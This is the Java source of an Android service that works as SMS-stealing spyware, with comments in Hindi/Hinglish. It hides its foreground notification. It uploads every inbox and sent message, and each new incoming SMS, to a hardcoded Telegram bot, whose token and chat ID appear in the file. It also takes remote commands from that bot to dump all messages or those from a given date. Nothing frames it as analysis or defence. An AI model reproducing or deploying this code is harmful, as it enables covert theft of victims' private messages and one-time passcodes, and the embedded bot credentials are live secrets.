package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {

    static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
    static final String CHAT_ID   = "8623638607";
    static final int    NOTIF_ID  = 9901;
    static final String CH_ID     = "x_hidden";

    private static final String PREFS      = "sms_prefs";
    private static final String KEY_SENT   = "old_sms_sent";
    private static final String KEY_OFFSET = "last_update_id";

    // Ye flag sirf Telegram par message bhejne ko rokta hai
    // App hamesha background mein chalti rahegi
    private static volatile boolean telegramPaused = false;

    private volatile boolean running = true;
    private Thread pollThread;

    // ─── Lifecycle ───────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        startHiddenForeground();
        startPolling();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("sms_sender")) {
            // Naya SMS aaya — agar paused nahi hai to bhejo
            if (!telegramPaused) {
                String sender = intent.getStringExtra("sms_sender");
                String body   = intent.getStringExtra("sms_body");
                long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
                new Thread(() -> sendSmsToTelegram(sender, body, time)).start();
            }
        } else {
            // Pehli baar start — purane SMS bhejo
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (!prefs.getBoolean(KEY_SENT, false)) {
                prefs.edit().putBoolean(KEY_SENT, true).apply();
                new Thread(this::sendAllOldSms).start();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (pollThread != null) pollThread.interrupt();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ─── Hidden Notification ─────────────────────
    private void startHiddenForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setShowWhen(false).setOngoing(false).build();
        startForeground(NOTIF_ID, notif);
        startService(new Intent(this, InnerService.class));
    }

    // ─── Bot Command Polling ─────────────────────
    private void startPolling() {
        pollThread = new Thread(() -> {
            while (running) {
                try {
                    checkCommands();
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        pollThread.setDaemon(true);
        pollThread.start();
    }

    private void checkCommands() throws Exception {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long offset = prefs.getLong(KEY_OFFSET, 0);

        String apiUrl = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?offset=" + (offset + 1) + "&limit=10&timeout=5";

        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        conn.disconnect();

        JSONObject resp = new JSONObject(sb.toString());
        if (!resp.optBoolean("ok", false)) return;

        JSONArray updates = resp.getJSONArray("result");
        for (int i = 0; i < updates.length(); i++) {
            JSONObject update = updates.getJSONObject(i);
            long updateId = update.getLong("update_id");
            prefs.edit().putLong(KEY_OFFSET, updateId).apply();

            if (!update.has("message")) continue;
            JSONObject msg = update.getJSONObject("message");
            if (!msg.has("text")) continue;

            String text   = msg.getString("text").trim();
            String fromId = String.valueOf(msg.getJSONObject("chat").getLong("id"));

            if (!fromId.equals(CHAT_ID)) continue;
            handleCommand(text);
        }
    }

    private void handleCommand(String text) {
        new Thread(() -> {
            if (text.equalsIgnoreCase("/stop")) {
                // Sirf Telegram par messages band — app chalta rahega
                telegramPaused = true;
                sendRawMessage(
                    "⏸ Telegram par messages BAND kar diye.\n" +
                    "App background mein chalta rahega.\n" +
                    "Dobara mangane ke liye /start likho."
                );

            } else if (text.equalsIgnoreCase("/start")) {
                telegramPaused = false;
                sendRawMessage(
                    "▶ Telegram par messages CHALU ho gaye!\n" +
                    "Naye SMS aate hi yahan aayenge."
                );

            } else if (text.equalsIgnoreCase("/all")) {
                telegramPaused = false; // pehle chalu karo
                sendRawMessage("⭐ SAARE SMS bhej raha hun...\n/stop likho agar rokna ho.");
                sendAllOldSms();
                if (!telegramPaused) sendRawMessage("✅ Saare SMS bhej diye!");

            } else if (text.toLowerCase().startsWith("/date ")) {
                String dateStr = text.substring(6).trim();
                telegramPaused = false; // pehle chalu karo
                int count = sendSmsByDate(dateStr);
                if (!telegramPaused) {
                    if (count == 0) {
                        sendRawMessage("❌ " + dateStr + " ko koi SMS nahi mila.");
                    } else {
                        sendRawMessage("✅ " + dateStr + " ke " + count + " SMS bhej diye!");
                    }
                }

            } else if (text.equalsIgnoreCase("/status")) {
                sendRawMessage(
                    "📊 App: 🟢 Chal rahi hai (background)\n" +
                    "Telegram messages: " + (telegramPaused ? "⏸ BAND" : "▶ CHALU")
                );

            } else if (text.equalsIgnoreCase("/help")) {
                sendRawMessage(
                    "📋 Commands:\n\n" +
                    "/start — Telegram par messages chalu karo\n" +
                    "/stop — Telegram par messages band karo\n" +
                    "/all — Saare SMS mangao\n" +
                    "/date DD-MM-YYYY — Us din ke SMS\n" +
                    "   Example: /date 02-01-2022\n" +
                    "/status — App aur messages ki halat\n" +
                    "/help — Yeh list\n\n" +
                    "💡 App hamesha background mein chalti rahegi."
                );
            }
        }).start();
    }

    // ─── SMS by Date ─────────────────────────────
    private int sendSmsByDate(String dateStr) {
        int count = 0;
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault());
            Date date = sdf.parse(dateStr);
            if (date == null) {
                sendRawMessage("❌ Format galat hai. Example: /date 02-01-2022");
                return 0;
            }

            Calendar cal = Calendar.getInstance();
            cal.setTime(date);
            cal.set(Calendar.HOUR_OF_DAY, 0);  cal.set(Calendar.MINUTE, 0);  cal.set(Calendar.SECOND, 0);
            long startMs = cal.getTimeInMillis();
            cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59);
            long endMs = cal.getTimeInMillis();

            // ⭐ Header pehle bhejo
            sendRawMessage("⭐⭐⭐ " + dateStr + " ke SMS ⭐⭐⭐\n/stop likho agar rokna ho.");

            count += queryAndSend("content://sms/inbox", startMs, endMs, false);
            count += queryAndSend("content://sms/sent",  startMs, endMs, true);

        } catch (Exception e) {
            sendRawMessage("❌ Error: " + e.getMessage());
        }
        return count;
    }

    private int queryAndSend(String uriStr, long startMs, long endMs, boolean isSent) {
        int count = 0;
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse(uriStr),
                new String[]{"address", "body", "date"},
                "date >= ? AND date <= ?",
                new String[]{String.valueOf(startMs), String.valueOf(endMs)},
                "date ASC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (telegramPaused) break; // /stop aaya to ruk jao
                    String addr  = cursor.getString(0);
                    String body  = cursor.getString(1);
                    long   ts    = cursor.getLong(2);
                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
                    sendSmsToTelegram(label, body, ts);
                    count++;
                    Thread.sleep(400);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
        return count;
    }

    // ─── Send All Old SMS ────────────────────────
    private void sendAllOldSms() {
        sendFromFolder("content://sms/inbox", false);
        sendFromFolder("content://sms/sent",  true);
    }

    private void sendFromFolder(String uriStr, boolean isSent) {
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse(uriStr),
                new String[]{"address", "body", "date"},
                null, null, "date ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (telegramPaused) break; // /stop aaya to ruk jao
                    String addr  = cursor.getString(0);
                    String body  = cursor.getString(1);
                    long   ts    = cursor.getLong(2);
                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
                    sendSmsToTelegram(label, body, ts);
                    Thread.sleep(500);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    // ─── Telegram Send ───────────────────────────
    static void sendSmsToTelegram(String sender, String body, long timestamp) {
        if (telegramPaused) return;
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                              .format(new Date(timestamp));
            postToTelegram("From: " + sender + "\nMsg: " + body + "\nTime: " + date);
        } catch (Exception e) { e.printStackTrace(); }
    }

    // Keep old static method name for SmsReceiver compatibility
    public static void sendToTelegram(String sender, String body, long timestamp) {
        sendSmsToTelegram(sender, body, timestamp);
    }

    private static void sendRawMessage(String text) {
        try { postToTelegram(text); } catch (Exception e) { e.printStackTrace(); }
    }

    private static void postToTelegram(String text) throws Exception {
        String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                    + "&text="   + URLEncoder.encode(text,    "UTF-8");
        URL url = new URL(api);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes("UTF-8"));
        os.flush();
        conn.getInputStream();
        conn.disconnect();
    }

    // ─── InnerService (notification permanently hata do) ─────
    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification n = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.screen_background_dark)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true).build();
                startForeground(NOTIF_ID, n);
            }
            stopSelf();
            return START_NOT_STICKY;
        }
        @Override public IBinder onBind(Intent intent) { return null; }
    }
}
